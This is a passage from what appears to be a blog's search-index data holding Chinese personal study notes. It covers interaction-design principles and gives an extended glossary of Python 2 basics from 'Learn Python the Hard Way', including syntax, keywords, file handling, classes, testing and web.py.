概要设计：需求分析阶段，用户要解决的痛苦是什么？如何给用户提供价值？ 行为（交互）设计：场景设计阶段，通过一系列用户和软件系统的交互，帮助用户解决问题。 界面设计：具体实现阶段，通过读取用户的输入，以及创造和改进交互的媒介，帮忙用户进行交互。 几个原则： 尽快提供可感触的反馈 系统界面符合用户的现实惯例，避免专业术语，而多采用生活化的语言。 用户有自由控制权：操作失误可回退，可以定制显示信息的多少，可以定制常用的设置 一致性和标准化：用语各处保持一致。 适合各种类型的用户：新手、专家、残疾人 帮助用户识别、诊断并修复错误：错误操作给出提示和帮助修正错误，关键操作要确认 有必要的提示和帮助文档，以及首次进入软件的引导页","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"项目管理","slug":"项目管理","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"}]},{"title":"笨办法学 Python","slug":"笨办法学 Python","date":"2014-12-09T00:32:00.000Z","updated":"2024-09-22T23:08:43.585Z","comments":true,"path":"2014/12/09/笨办法学 Python/","permalink":"http://example.com/2014/12/09/%E7%AC%A8%E5%8A%9E%E6%B3%95%E5%AD%A6%20Python/","excerpt":"","text":"单词符号表、名称、作用 print：打印； “”：双引号，表示引号内的内容是字符串； ‘’：单引号，表示引号内的内容是字符串，作用同双引号，区别在于双引号表示长内容，单引号常用于表示短单词；可与双引号配合使用，即在双引号表示的长句子内，用单引号表示某个需要加引号的单词； #：井号，表示单行注释 井号后面的内容不会被执行 多行注释则在每一行开头加井号； 注释不一定写在一行的开头，也可以写在一行的末尾； 如果被双引号括起来，则此时井号不会被当作注释符，例如：print “Hi, # here.” +： 加号 数学运算符，对符号两侧的数值做加法运算； 还可以用来在print表示字符串变量的拼接，例如print var1 + var2 + var3（如果变量是数值，则此时就会运算了，如果有些是数值，有些是字符串，则会报错） -： 减号，同上，减法运算； *： 乘号 乘法运算； 还可以用来表示多次重复打印某个字符串，例如print “string” * 10（将string连续打印10遍）； &#x2F;，斜杠，同上，除法运算； %，百分号，同上，求余数运算； &lt;，小于号 &#x2F;&gt;，大于号 &lt;&#x3D;，小于等于号 &#x2F;&gt;&#x3D;，大于等于号 &#x3D; 等于号，赋值； 可以这样用：a, b, c &#x3D; 1, 2, 3（在一行中一次性将3个值赋值给3个变量） 这样做有一个意想不到的好处，示例： a, b &#x3D; b, a+b（即在 a 改变数值前，将 a 原来的值用于运算得到新的 b 值） . 点 可用来表示浮点数 使用函数，示例：file.read() &#x3D;&#x3D;，双等号，用来判断两个值是否相同； %s 将字符串类型的变量带到字符串中 当变量是数值类型时，运行不会报错，仍然能够正常输出；（猜测可能将数值转成了字符串？） %d 将数值类型的变量带到字符串中； 当变量值是字符串时，运行会报错，提示需要数值类型，而非字符串类型； %r 将任何类型的变量带到字符串中（不管什么都打印出来，只有在想获取某些东西的调试信息时使用，正常应该使用%s）（%r用于调试，%s用于显示） %r 用来输出原始格式，debug时使用比较好，平时用%s；使用%r会使得字符串中的“\\n”换行符失效； %：百分号 可在字符串中实现对变量的引用，经测试不能用来在字符串中做运算，但可以做好运算再引用到字符串中； ( )：括号 在字符串中引用变量时，可以用来容纳多个变量，例如 % (var1, var2) 和函数一起使用，括号内可放函数的参数，多个参数之间用逗号隔开； ， 逗号 在字符串中引用变量时，可以用来连接两个变量；变量用逗号隔开，示例：% (var1, var2) 在print中，可以用来表示连接两个变量，输出时两个变量会在同一行，逗号会变成空格，例如print var1, var2（输出结果为var1 var2，如果没有逗号，会报错）（此处如果使用+加号，则表示将变量的字符串拼接在一起，中间没有空格） print打印自带换行，有逗号则不会换行；即如果在print后面加逗号，则print结束后，不会输出换行符跑到下一行，例如 print var1, 浮点数：通过在小数点后面加零实现（好奇，如果需要的小数位数比较多的话，每次输入岂不是很麻烦？貌似可以通过设定变量来解决） 函数round()可以实现四舍五入，例如：round(1.73333) 运算优先级：括号&gt;指数&gt;乘&gt;除&gt;加&gt;减 _ ：下划线：常在变量命名时用来连接单词，意指空格，函数的命名也是使用下划线，类的命名则使用驼峰大写 False，开头字母大写时，是一个布尔值；类似的还有True；输出这两个值的时候，不需要加引号，它们是python的关键字； 使用%r的时候，\\n 就不灵了，因为%r会输出原始格式，例如：print “Hi %r here.” % Mon\\nFeb “”” 或者 ‘’’，三个连续的双引号或者三个单引号，用来表示段落字符串； \\n：换行；类似的还有\\t（水平制表符），\\v（垂直制表符），\\r（回车符）； \\： 反斜杠，转义符，用来输入一些做为关键字符的符号本身； raw_input()： 获得用户在控制台的输入信息； raw_input和input： 通过读取控制台的输入，实现与用户的交互； 二者的差别在于前者可以读取任何输入，后者希望读取一个合法的输入（合乎python的语法），例如字符串需要用引号括起来（会被当作代码处理，应该避开使用这个函数）； raw_input()的括号里面可以放提示； from sys import argv： 从 sys 引入 argv 模块（全称：argument variable，参数变量；模块有一些特性，可以方便的产生一些作用；argv 的特性是会保存运行python脚本时传递给 python 脚本的参数 如果有多个参数传递给脚本，在引用argv模块后，需要将argv解包，并将参数依次赋值给相应的变量 import 导入的参数会当作字符串来解包并赋值给相应的变量 open(filename)： 作用：打开文件，括号内的参数为要打开的文件的文件名； open返回的是文件对象本身，不是文件内容，可在这个对象中找出想要的内容； open(filename, ‘w’)：第二个参数 w 的意思是以写入模式打开，此种模式允许对文件进行写入；如果是 r 参数，则是只读模式；a 参数（append）表示追加模式； w+, r+, a+：将文件以同时读写的方式打开，不同符号实现在文件内的不同定位； read()： 作用：读取文件，可将结果赋值给一个变量，示例：txt &#x3D; open(filename).read()； read()一旦运行，文件会被python关掉，可以无需再运行open(filename).close()； close()：关闭一个文件，示例：open(filename).close()； readline()： 读取文件中的一行，示例open(filename).readline(3)； 读完之后，会将“磁头”（游标）移动到该行的换行符”\\n”后面； readline()会扫描文件，直至找到一个\\n，然后返回前面的内容，同时停止在那个位置，位置信息记录在相应的文件中；下次再调用readline()时，会接着从停止的位置接着往下扫描； readlines() 会一次性将整个文件读入内存，而 readline() 一次只读一行，前者处理速度更快,但对内存大小有要求，后者则适合当文件超过内存大小时使用； truncate()：清空文件，小心使用； write(stuff)：将stuff写入文件中，示例open(filename).write(stuff)；stuff如果是字符串，可以使用+将多个字符串连接起来（包括转义符）同时写入，示例：write(var1+”\\n”+var2+”\\n”) CTRL^C：可以在脚本运行的过程中途退出，一种方法是使用raw_input()来获得用户的这个指令； from oa.path import exists：exists(filename)可以用来判断filename文件是否存在，如果存在返回True，如果不存在，返回False； len(string)：获得string字符串的长度，返回长度数值；示例：len(open(filename).read()) def： 定义一个函数（或者叫创建一个函数）；示例：def print_two(arg1, arg2)； 函数里面的变量，和脚本里面的变量，是没有联系的；（目测在js里面叫做词法作用域？） 函数可以返回某些东西；也可以不返回值（此点跟 js 不一样, js 如果没有指定返回值，会返回undefined值）（后来发现一样，没有指定返回值，会返回none） *argv：可以用来接收多个参数，之后再解包依次赋值给变量，示例：def print_two(*argv)； 函数的参数支持：单独的变量，数字与变量的运算、数字与数字的运算（如果参数是数值类型的话）、变量与变量的运算； seek()： 作用：操作文件游标移动 示例：f.seek(0) 参数0表示从头，参数1表示从当前，参数2表示从末尾； # -*- coding: utf-8 -*-：转成utf-8编码，可以直接写成 #coding: utf-8，不知为什么作者写得那么复杂，为了好看？ 使用%s和%d，在字符串引用参数时，可以在语句后面直接写上参数名，也可以由函数返回参数值；示例： print “%s, %d, %d” % function(var), def function(var) {return var1, var2, var3)} from ex25 import *：将ex25文件里面的模块全部导出来，省得每次调用函数的时候老是需要写前缀“ex25.”； help(ex25)：用来显示ex25里面的帮助文档，或者叫“文档注释”；文档注释是这么写的 def function(var) “””这里是文档注释，用三个双引号括起来””” 还可以这样：help(ex25.function1)，只显示其中某个函数的注释； 布尔表达式 and：从左到右找False，找到后返回False，找不到返回True； or：从左到右找True，找到后返回True，找不到返回False； 布尔表达式返回：按规则寻找，有找到时，按规则返回；没找到时，返回两个操作对象中后面的那个 “test” and 1：返回1； 1 and “test”，返回test 1 and False：返回False； False and 1：返回False； 1 and True：返回True； Ture and 1：返回1； 1 or False：返回1； False or 1：返回1； 1 or True：返回1 Ture or 1：返回True +&#x3D;：此符号可以用来表示递增，用法示例：x +&#x3D; 2，表示：x &#x3D; x + 2；类似的有 x -&#x3D; 2, x *&#x3D; 2；x &#x2F;&#x3D; 2； print i +&#x3D; 1是不可接受的，会报错；需要这样子：i +&#x3D; 1, print i；另外，print i + 1，是允许的（目测在print语句中不能使用等号&#x3D;来给变量赋值） if 语句首先以冒号结束，接下来需要4个空格的缩进（经测试发现1个以上的空格就可以），如果不缩进，程序会报错； if, elif, else：组成段落后，python只会运行它遇到的第1个是True的块； 列表list： 一个按顺序存放东西的容器；以方括号[]开头和结束，中间的东西用逗号隔开；可以用等号&#x3D;赋值给一个变量； list.append(i)：在列表的尾部追加元素i；使用示例：list.append(i)； list[-1]：获取倒数第一个元素；list[-2]：获取列表中倒数第2个元素； range(x, y)：x和y需要是整数；如果x是以零开头，则可以简写成range(y)； range()函数的返回值是一个列表，因此可以写成：elements &#x3D; range(0, 6)，它的意思等同于 elements &#x3D; [], for i in range(0, 6), elements.append(i)； 目测列表才有pop属性，字符串好像没有，因为使用string.pop会报错，提示无此属性； 字符串的操作 replace 用法：用来将字符串的旧字符替换为新字符，并且可以指定最大替换条目（次数）(可选参数），返回替换后的新字符串 示例： str_A.replace(old_str, new_str) str_B.replace(old_str, new_str，5) 列表有很多操作，如下： add contains deitem delslice setitem setslice eq ge getattribute getitem getslice gt iadd lt sizeof reversed imul pop： pop( )：如果括号内没有数字，表示删除最后一个元素，并返回该元素 pop(n)，删除列表中位置为 n 的元素,并返回该元素 ； remove： 删除指定值的元素 例如: list &#x3D; [1, 2, 3, 8, 9]，则 list.remove(8) 之后，list 为 [1, 2, 3, 9] del 删除指定位置的元素 例如： list &#x3D; [1, 2, 3, 8, 9]，则 del li[2] 之后， list 为 [1, 2, 8, 9] reverse extend 用法：给当前列表在尾部追加另外一个列表的所有元素，另外一个列表做为 extend 函数的参数，参数必须是列表类型 示例：list_A.extend(list_B) append 用法：给当前列表在尾部增加一个元素，需要添加的元素做为 append 函数的参数，参数可以是任意类型 示例：list_A.append(var_B) sort insert index 列表和数组从经典意义上理解是不同的，因为它们的实现方式不同；不同的语言中称呼不同，ruby 和 js 中叫做数组，python 中叫做列表； for i in range():：循环开始的时候，定义了变量i；每次循环的时候，它会被重新定义一次； for i in range(1, 3)：只会循环2次，而不是3次；从第1个数开始，但不包括最后一个数； 一行语句只要以冒号：结尾，下一行就需要缩进，不然会报错，例如函数和if语句；冒号的作用是告诉python接下来会创建一个新的代码块；if, elif, else, 函数等都是强制缩进的，首行以冒号结束 while循环的规则 尽量少用while循环，大部分情况for循环是更好的选择； 重复检查while语句，确保测试的布尔表达式最终会变成False； 如果不确定，就在while循环的结尾打印出要测试的值。看看它的变化 ； 对于 while a !&#x3D; b 这种情况，目测好像 while 循环比 for 循环更好用一些； raw_input()抓取的东西是字符串，即使录入数字也会当做字符串对待，因此需要使用int(raw_input())将输入转化成数字； for i in range(0, x)：i会在运行的过程中递增； 如果多个elif块都是True，python只会运行它遇到的第一个值为True的块，余下忽略不运行； 序数：用某种规则进行排列的数的集合； 基数：每个数有一个索引，对应一个地址，可以通过这个地址快速找到某个数； while True可以创建一个无限的循环； exit(0)可以中断某个程序，正常退出；exit(1)表示发生了错误； if 语句的规则 每一条 if 语句必须包含一个else； 如果这个 else 永远都不应该被执行到，那就必须在else语句后面使用 die 函数，让它打印出错误信息并且死给你看，这样可以找到很多错误； if 语句的嵌套不要超过两层，尽量保持一层；如果if里面要再嵌套一个 if，考虑将第二个if弄到一个函数里； 将 if 语句做为段落对待，即段落前面空一行，结束后空一行，有利于阅读，知道从哪里开始，到哪里结束； 布尔测试应该很简单，如果很复杂，则将它们的运算先放到一个变量里，给变量取个好名字（会更容易阅读，避免阅读的时候，还要做运算，因为此时大脑在思考逻辑）； 循环的规则 只有在循环永不结束的时候使用while（显示这不可能，所以尽量别用while） 其他循环使用for； 调试的技巧 别用debugger：因为输出太多，干扰阅读 使用print：打印出关键变量，判断程序是否如期运行； 写一点，运行一点，再修改一点；不要等一个很长的脚本写完后再运行它； 关键字 and 与运算符，用来做逻辑运算； 判断规则：从左往右寻找False，找到即返回，找不到返回True del 对列表进行元素的删除操作 示例，假设a &#x3D; [8, ‘ss’, ‘kk’, 20] del a[0]：表示删除列表a的第1个元素； del a[1:3]：表示删除列表的第2到4个元素； del a #：表示删除整个列表，a会完全消失，跟没定义过一样； from 引入模块时使用，示例：from sys import argv from aa import bb与 import bb的区别 后者使用的时候需要写成：aa.bb()，前者不用，直接写 bb()，相当于把路径提前告知了； 如果不存在两个模块的重名问题，则可以写：from aa import * 如果存在重名问题，则只能写 import bb，然后使用的时候写：aa.bb(), 或者 cc.bb() not 非，逻辑运算符，将False变成True，反之亦然； while 循环，如果条件为True，运行代码块；运行后再回到开头位置，再判断条件，如果为True，再次运行代码块；直至条件变为False为止； as 跟with配套使用，示例：with aa as bb，意思是：执行aa对象的enter方法，将返回值赋值给bb，并执行aa对象的exit方法，结束； 作用类同于try…finally… elif 条件判断，跟if一起配套使用 常见句式：if…: elif…: else: global 用来说明变量是全局的，以便在函数内部使用 示例： x &#x3D; 50 def func(): global x x &#x3D; x * 2 print x 如果要指定多个，可以这样：global x, y, z or 或，逻辑运算符 规则：从左到右寻找 True，找到即返回，找不到返回 False； with 跟 as 配套使用，with aa as bb，作用类同于 try…finallly…，执行 aa，将返回值赋值给 bb assert 用来将调试断点插入到程序中 示例：assert expression（表达式） 示例1：assert n&gt;&#x3D;2 示例2：assert expression1, expression2 assert 5 &gt; 3, print “肯定是错的”2 assert 0 &gt; 3, print “肯定是对的” 作用类似于：if not expression: raise AssertionError else 条件语句，跟 if 配套使用 if 条件语句，跟else，elif（如需）配套使用 只会执行遇到的条件为 True 的代码块； pass 空操作：它是一个语句，这一点很重要，但同时告诉程序什么都不用做，往下走即可。如果没有它，有可能程序语法不完整导致报错 它可以用来放置在一些没有想好怎么写的位置，类似于先占个位子； yield 这个不简单，带有yield的函数有两个作用 生成器，每次调用的时候返回一个生成器对象，好处是内存占用小，因为使用迭代的方式来获得返回值，内存开销是一个固定值 例如生成斐波数列，如果上限很大，且使用列表的方式，会导致保存列表的内存占用很大；此时使用yield的好处是每次调用只返回一值，通过重复调用来获得完整的数列； 另外也可用于文件的读取，目的也是减少内存开销； break 立即结束循环并退出，之后的代码不会被执行 except 用来处理异常，常与try配合使用；当try里面的代码块被执行后，有可能引发异常，此时如果有except语句，则程序会跳到第一个except语句，判断异常是否符合语句表达的条件，如果符合，则执行except下的代码块，如果不符合，则寻找下一个except语句；如果找完全部没找到，貌似会调用python的l默认处理器，自动终止程序退出；有except处理则不会自动终止退出； import import用来导入模块，模块包含一些类和函数，可以实现某些功能；当我们需要这些功能的时候，就使用import来导入 模块 模块是包含函数和变量的 python 文件 可以导入这个文件 然后可以使用 . 操作符访问模块中的函数和变量 print 用来输出内容，包括整数、16进制数、8进制数、浮点数、字符串、列表等 class 用来定义类 什么是类：用来快速的创建对象，制造对象的工厂 类支持两种操作 一种是引用，即访问类中的属性； 一种是实例化，即通过类创建对象； exec 用来执行存储在字符串或文件中的python语句，例如 exec “print ‘Hello World’” in 可用来判断一个元素是否在列表里面，示例：if a in list raise 可以用来引发一个异常 continue 用来跳出当次循环，但继续执行后续的循环 与break的区别：break跳出当次循环后，不再执行后续的循环，直接退出了 finally 与 try 配合使用，执行完 try 的代码块后，继续执行 finally 的代码块，不管 try 是否抛出异常； 与 try…except…相冲突，二者只能用其一； finally 的代码块必会被执行，但 except 不一定，如果 try 没有抛出异常， except 的代码块不会被执行 is 用来判断A对象是否是B对象，即它本人；对象有3个属性，分别是 id, type, value，is 的原理是判断两个对象的 id 是否相同 &#x3D;&#x3D; 用来判断两个对象的值是否相等； return 用在函数中的返回，可以选择性的返回一个值； 如果没有指定返回值，函数会默认返回None 如果没有写 return 语句，函数其实会默认执行一条 return None 的语句 def 用来创建函数 for 用来创建循环，它可以遍历一个序列中的所有项目 示例：for i in range(0, 6) lambda 用来创建一个匿名函数，示例：g &#x3D; lambda x: x +1（类同于，def g(x): x+1） 好处：没有像普通 def 创建函数一样生成栈，更快更简洁，提高性能（不需多次调用的情况下） 语法：支持多个参数，示例：g &#x3D; lambda x, y: x + y（冒号左边是参数，右边是返回值） try 主要用来处理异常，有两种风格 try…except…else… 如果 try 发生异常，并没有匹配到 except，则会将异常抛给上一层 try （如果上一层 try 也法匹配呢？猜测要触发自动处理机制了） except: 捕获所有异常 except name: 只捕获名字为 name 的特定异常； except name, value: 捕获异常，并获得它的附加数据 except (name1, name2, … )：捕获多个异常 else: 如果没有发生异常 try…finally… 数据类型 True：布尔值 False：布尔值 None：没有值 strings：字符串，示例：’snow’, ‘winter’ numbers：数字，示例：5, 4, 3 floats：浮点数，示例：1.08 lists：列表，示例：a &#x3D; [8, 10, 12, 14, 16] 字符串转义序列 \\ &#39; &quot; \\a：alarm，响铃，会出现一声铃声； \\b：backspace，退格，会删除一个字符； \\f：换页符 \\n：换行符 \\r：回车符 \\t：tab，水平制表符 \\v：vertical，垂直制表符 字符串格式化 %d：数字 %i：据说等同于 %d，只是现在逐步不用了； %o：转成无符号八进制数 %u：转成无符号十进制数 %x：转成无符号的十六进制数（小写） %X：转成无符号的十六进制数（大写） %e：转成科学计数法（小写） %E：转成科学计数法（大写） %f：转成浮点数，示例：%.2f，取两位小数，四舍五入 %F：转成浮点数，小数部分自然截断 %g：%e 和 %f 的简写 %G：%E 和 %F 的简写 %c：转换成字符（ASCII 码值，或者长度为一的字符串） %r：优先用 repr() 进行字符串转换（调试用，会原原本本的输出字符串内容，不识别处理里面的符号） %s：转换成字符串 %%：输出% 操作符 ：乘方，示例：24，表示2的4次方 &#x2F;：浮点数除法，返回结果为浮点数 &#x2F;&#x2F;：整数除法，返回结果为整数 % &lt; &lt;&#x3D; &#x3D; &#x3D;&#x3D; !&#x3D; &lt;&gt; ( )：元组数据类型 [ ]：列表数据类型 { }：字典数据类型 @：修饰符，据称是为了调用函数用的，暂时不明白具体用法，待后补 , 逗号 : 冒号 . 点 &#x3D; 等号 ; 分号 +&#x3D; 自增 -&#x3D; 自减 *&#x3D; 自乘 &#x2F;&#x3D; 自除 &#x2F;&#x2F;&#x3D; （不知道啥意思，莫非是自整除？） %&#x3D; 自求余数 **&#x3D; 自平方 ‘ ‘.join(stuff)：python实际执行的动作为 join(‘ ‘, stuff)，前者翻译为：用空格 ‘ ‘ 连接 stuff，后者翻译为：为空格 ‘ ‘ 和 stuff 调用 join 函数，二者是一个意思 dir(object)：查看对象 object 内的所有属性和方法； 示例： import sys dir(sys) 字典 作用之一：可以通过任何东西（不只是数字）找到元素； 字典可以将一个物件和另外一个物件关联，不管它们的类型是什么；这是一种将一种东西对应到另外一种的方式 可以通过字符串从字典里面提取东西，也可以通过字符串往字典里面添加东西； del 可以将字典里面的东西删除 字典的内容是无序的 dict.get(k, d)：如果 k 在 dict 里面，则返回 dict[k]； 如果不在，则返回 d dict.keys() :提取字典里面的key组成一个列表返回 dict.values() :提取字典里面的value组成一个列表返回 dict.items() : 提取字典里面的（key, value）组成一个元组列表返回； 字典与模块差不多 相同点：从 Y 获取 X 的概念 不同点 字典的语法：使用 [键]，示例：dict[x]（注：对于字典，键是一个字符串） 模块的语法：使用点 “.”，示例：module.x（注：对于模块，键是一个函数或者一个变量） 类和模块差不多 模块的另外一种理解方法：一种特殊的字典，存储一些代码，可以通过点“.”操作符来访问这些代码；Python还有另外一种结构来实现类似的目的，即类，可以把一组函数和数据放到容器中，从而用“.”操作符来访问它们（函数和数据）（类有些类似于迷你模块） 使用类而非模块的原因：可以用类重复创建出很多出来，它们之间不会互相干涉；而对于模块，一次导入后，整个程序里面只有一份内容； 对象：相当于迷你导入； 实例化：如果类和迷你模块差不多，则也会存在一个“导入”的动作，此动作称为“实例化”，名称很高深，其实就是“创建”的意思，实例化后，会得到一个“对象” 过程： 调用类 创建空对象（相当于创建迷你模块，然后导入它） 如果有 init() 函数，调用该函数对空对象进行初始化（init 函数里面有一个多余的函数 self，即是 python 创建的空对象，可以对它进行类似模块、字典等操作，为它设置一些变量进去） 将初始化后的对象赋值给一个变量 接下来可以对变量进行后续操作 单词练习 类（class）：告诉 python 创建新类型的东西（貌似类的起名首字母习惯用大写） 对象（object）：两个意思，即最基本的东西，或者某个东西的实例； 实例（instance）：这是让 Python 创建一个对象时得到的东西； def：在类里面定义函数的方法 self：在类的函数里，self 指代被访问的对象或者实例的一个变量； 继承（inheritance）：指一个类可以继承另一个类的特性，和父子关系类似； 组合（composition）：指一个类可以将别的类做为它的部件构建起来，有点儿像车子和车轮的关系； 属性（attribute）：类的一个属性，它来自于组合，而且通常是一个变量；（如果没有组合呢？是否还有属性？） 是什么（is-a）：用来描述继承关系，如 Salmon is-a Fish； 有什么（has-a）：用来描述某个东西是由另外一些东西组成的，或者某个东西有某个特征，如 Salmon has-a mouth. 语汇练习 class X(Y)：创建一个叫做 X 的类，它是 Y 的一种；（难道有好几种 Y？） class X(object)：def init(self, J)：类X有一个_init_接收 self 和 J 做为参数； class X(object)：def M(self, J)：类X有一个函数名称为M，它接收 self 和 J 做为参数； foo &#x3D; X()：将 foo 设为类 X 的一个实例； foo.M(J)：从 foo 中找到 M 函数， 并使用 self 和 J 参数调用它； foo.K &#x3D; Q：从 foo 中获取 K 属性，并将其设为 Q； 类和对象并没有真正的不同，它们其实是同样的对象，只是在不同的时间名字不同罢了。对象是类的一个实例； __init__，init的左右两侧是两个下划线，不是一个，注意！ __init__函数是默认存在的，它在创建类的实例时自动执行，不需要手动写class.function来运行；正常它什么都不做，但当在类中对其描述时，表示要让它做点什么； 自顶向下 把要解决的问题写下来，或者画出流程图 将第一条的关键概念摘录出来，并加以研究 创建一个类和对象的层次结构图 用代码实现各个类，并写一个测试来运行它们 重复上述步骤并细化代码 大部分使用继承的场合都可以用合成替代，而多重继承则需要不惜一切地避免之； 类和模块各自的适用场景，什么时候用类，什么时候用模块？如果有一些代码会在不同的位置和场合应用到，那就用合成来把它们做成模块 继承与合成 不惜一切代价避免使用多重继承，因为它们引发的问题比带来的好处多得多（如果非要用，得准备好专研类的层次结构，以及花时间寻找各种东西的来龙去脉） 如果有一些代码会在不同的位置和场合应用到，那就用合成来把它们做成模块 只有在代码之间有清楚关联，可以通过一个单独的共性联系起来的时候，使用继承；或者受现有代码或者别的不可抗力因素所限非用不可，那就用吧（程序员创建软件包，共享代码，是一种社交习俗，因此有时因为同事原因，需要打破这些习俗） 模块 为什么使用？ 当函数很多的时候，进行分组，让每个文件的代码减少，提高可维护性； 一次编写，多个场合引用 避免函数名和变量名的冲突 其他 模块可以放在包里，避免模块命名的冲突，引用示例：包名.模块名 包可以有多层，即包上层还可以有包，支持多级结构，示例：大包名.小包名.模块名 函数的风格 在类中创建函数时，使用动词来命名，作为给类的一个命令； 让函数保持简单小巧 类的风格 类命名应该使用驼峰式大小写，例如：ThisIsClass 函数命名应该使用下划线，例如：This_Is_Function __init__不应该做太多事情，这会让类变得很难用 注释 写注释的时候，描述清楚为什么要这么做，代码本身表明“如何实现”，但为什么更重要 函数的注释，用一两句话写写这个函数的用法，还是很有用的； 尽量让注释短小精悍，一语中的（如果更新了代码，记得检查注释是否需要更新维护） 在测试文件所在目录的上一级目录运行测试文件，人们常犯的一个错误是在测试目录中运行测试文件； pip 的用法 pip：win10，先下载tar格式的压缩包，解压到某文件夹，powershell，cd命令进入该文件夹，输入指令：python setup.py install，即开始安装 有了pip后，其他几个就好办了，直接在powershell里面输入：pip install “包名字”.whl 显示安装了什么版本的包：pip show –files SomePackage 显示非最新版本的包：pip list –outdated 安装最新版本的包：pip install –upgrade SomePackage 卸载不需要的包：pip uninstall SomePackage dict.update(dict2)：将 dict2 添加到 dict 中 示例：dict &#x3D; {‘age’: 47, ‘sex’: male}, dict2 &#x3D; {‘tall’: 6’5”} 运行：dic.update(dict2) 结果：dict &#x3D; {‘age’: 47, ‘sex’: male, ‘tall’: 6’5”} dict.get(key, default)：从字典中取 key 对应的 value，如果取不到则返回 default 值 测试用例应该保存在 test&#x2F; 下面，不然不会被 nosetests 执行； 测试用例的代码应该尽量保持整洁，尽量删除里面的重复代码，可以通过创建一些辅助函数来删除重复代码，这样在未来修改测试用例时，可以节省很多工作量； 别太把测试当做一回事，有时候，最好的办法是把代码和测试全部删掉，然后重新设计代码； nosetests 的用法 首先，是 nosetests，不是 notetests，名称别写错了 凡是有重复代码的地方，则应考虑是否抽象单独的函数或类 类里面的函数至少需要一个参数self split() 函数可以将字符串按空格（或者其它标记也行）拆分成多个字符串，返回由多个字符串组成的列表 元组是一个不能修改的列表，使用圆括号（为什么元组设定为不能修改，这样的好处是什么？） 对象只能通过对类的实例化进行创建，不能创建不基于类的对象； 列表的各个元素中间记得用逗号隔开！！！ 从raw_input获得的数字是字符串，但当使用 int() 转换成数字后，后续的使用可以直接作为数字，不需要再用引号包含起来作字符串使用 字符串大小写转换的函数： upper( )：全部大写 lower( )：全部小写 capitalized( )：字符串的首字母大写 title( )：字符串内所有单词首字母大写 用法：string.lower( ) isdigit( ): 判断字符串是否为数字 类可以被单独导入，对象也可以被单独导入，例如 test.py 文件中有一个类叫做 SampleClass，有一个对象为 sample_object &#x3D; SampleClass()，则可以如此导入：from test import sample_object 通过导入模块，可以访问模块中的函数、对象、变量； 对于字典来说，键是一个字符串，获得值的语法是“[键]”；对于模块来说，键是函数或者变量的名称，而语法是 “.键” 类的作用类似于一个迷你模块，在这个迷你模块中放了一些函数和数据，可以访问；相对模块，使用类的好处在于，它是一份模板，可以基于这份模板创建无数个对象，然后这些对象各自发挥作用并且不会相互影响，而使用模块，则无法实现这个效果； 当想让模块发挥作用的时候，通过 import 导入这个模块；当想让类发挥作用时，通过实例化，即创建对象发挥作用，例如： thing &#x3D; SampleClass() 面向对象编程的好处： 封闭：统一接口，解藕（应付需求变更） 归一：简化设计（寻求事物的本质） 类变量和实例变量的不同 类变量由所有对象共有 实例变量由各个对象独有 因此：当由类生成A、B两个对象时，如果A对象对类变量进行了变更，则B对象再访问类变量时，值已被更新 另外，可以通过在变量名称前加双下划线“__”，来声明该类变量是类的内部私有（即只能在类的内部被访问，不能在类的外部访问） 在类的__init__创建变量时，记得加上前缀 self，例如：self.var &#x3D; value assert_raises的用法 示例：assert_raises(ParseError, parse_verb, word.list1) 释意：ParseError 表示应引发的异常， parse_verb是要调用的函数，word.list1是要传给要调用的函数的参数 assert的其他用法 assert 和 assert_equal，示例如下： assert var1 &#x3D;&#x3D; var2 assert_equal(var1, var2) try..except 和 assert_raises assert_raises(Exception, func, var1, var2) try: func(var1, var2) except Exception except Exception: pass web.py python bin&#x2F;app.py 1234（用1234来指定访问的端口号（不写则默认为8080），此时可使用 localhost:1234 来访问） $name 会将变量转义为字符串，如果变量中带有要执行的HTML代码，则可以使用 $:name 代替 $name（HTML文件中使用） 通过 urls &#x3D; ( ‘&#x2F;(.)’, ‘Index’)，中的 ‘&#x2F;(.)’ 替代之前的 ‘&#x2F;‘ ，以获取 ‘&#x2F;‘ 后面的字符并将其做为参数传递给 Index 类 可以在 urls 中放置多个元组（用逗号隔开），以便让不同的 url 指向不同的类 seeother()：用来跳转到其他页面，例如：当通过 form 提交一个表单后，使用 seeother(‘&#x2F;someotherpage’)，此时POST方法将返回给浏览器 303状态值和一个新网址，浏览器会对这个新网址发出GET请求； redirect(‘&#x2F;someotherpage’)：用来重定向到新的页面 web.header(“Content-Type”, “text&#x2F;html; charset&#x3D;utf-8”)：用来在输入内容前，向浏览器传送一些头部信息，目的是让浏览器能够正确识别内容； 使用 cgi 模块来限制上传文件的大小，示例： import cgi cgi.maxlen &#x3D; 510241024 #表示最大为5M try: 正常代码 except ValueError: return “File too large” #给出文件过大的提示 web.input()：包含一个从url（GET方法）或者header（POST方法）获取的变量的一个对象 web.stroage 对象（类似字典）；当表单提交多个值时，此时写成 web.input(id&#x3D;[])，以便告诉 input 默认传递值是一个多值列表，不然默认当成一个字符串处理（即使传递数字也会当作字符串处理）； re 模块：regular expression, 正则表达式 怎么用？ if name &#x3D;&#x3D; “main“: app.run() 背景：模块有自带一个__name__属性 如果 py 文件被直接运行，则 name 被赋值为__main__ 如果 py 文件被 import，则 name 被赋值为模块名（不带扩展名） 以上语句表示，当 name 的值为 main 的时候，语句被执行；若不是，则不执行； kill()：用来杀死进程，退出程序，还有其他两种方法，分别为： sys.exit()，参数可为0，正常退出；1，异常退出； os.exit()， str(var) 和 repr(var)：将任意值转化成字符串，前者供人阅读的格式，后者为供机器阅读的格式 HTML pre 是 Preformatted text（预格式化文本） 的缩写。使用此标签可以把代码中的空格和换行直接显示到页面上。但是 &lt; 、 &gt; 和 &amp; 等特殊文字需要用 &lt; 、 &gt; 和 &amp; 的方式记述 HTML 状态码 2系，成功 3系，重定向 4系，请求错误 5系，服务器错误 HTML form 表单也可以通过 GET 方法提交，只是有些缺点，例如数据不安全（在 url 中可见），传输大小有限制；示例：&lt;form ,action&#x3D;”&#x2F;hello”, method&#x3D;”GET”&gt; 在 HTML 中用 python 定义函数时，支持与 HTML 标签混编，但在调用函数时，需要在美元符后面加冒号 示例：$def hello(name): &lt;h1&gt;$name&lt;&#x2F;h1&gt; 调用：$:hello(name) def foo(a, b&#x3D;0) 函数有两个参数，其中第二个是可选参数，且有默认值0，此时如果调用函数的时候，只传递一个参数，则自动赋值给a； def foo(a, b, *c) 函数有两个固定参数和一个可选参数c 示例：foo(1, 2, 3, 4, 5)，此时 a 赋值1，b 赋值2, c 赋值（3，4，5）元组； 如果只传递两个参数，则 c 